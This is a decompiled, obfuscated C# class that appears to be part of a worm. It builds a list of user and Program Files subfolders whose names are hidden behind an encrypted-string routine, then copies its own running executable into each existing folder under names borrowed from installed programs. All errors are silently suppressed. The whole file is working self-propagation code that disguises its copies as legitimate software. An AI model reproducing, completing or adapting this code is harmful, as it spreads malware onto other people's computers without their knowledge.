using System;
using System.Collections;
using System.Diagnostics;
using System.IO;

namespace ___codefort;

internal sealed class Class19
{
	public static void smethod_0()
	{
		try
		{
			int num = 0;
			ArrayList arrayList = new ArrayList();
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Class22.smethod_0(737975442));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Class22.smethod_0(737975469));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Class22.smethod_0(737975365));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_0(737975371));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Class22.smethod_0(737975442));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975406));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975296));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975321));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975358));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975770));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975682));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975716));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975739));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975634));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975665));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975571));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975595));
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737974983));
			IEnumerator enumerator = arrayList.GetEnumerator();
			while (enumerator.MoveNext())
			{
				string text = Convert.ToString(enumerator.Current);
				if (Directory.Exists(text))
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
					string[] directories = Directory.GetDirectories(folderPath);
					foreach (string text2 in directories)
					{
						string destFileName = text + Class22.smethod_0(737969724) + text2.Substring(text2.LastIndexOf(Class22.smethod_0(737969724))).Replace(Class22.smethod_0(737969724), string.Empty) + Class22.smethod_0(737974994);
						File.Copy(Process.GetCurrentProcess().MainModule!.FileName, destFileName, overwrite: true);
						num++;
					}
				}
			}
		}
		catch
		{
		}
	}
}
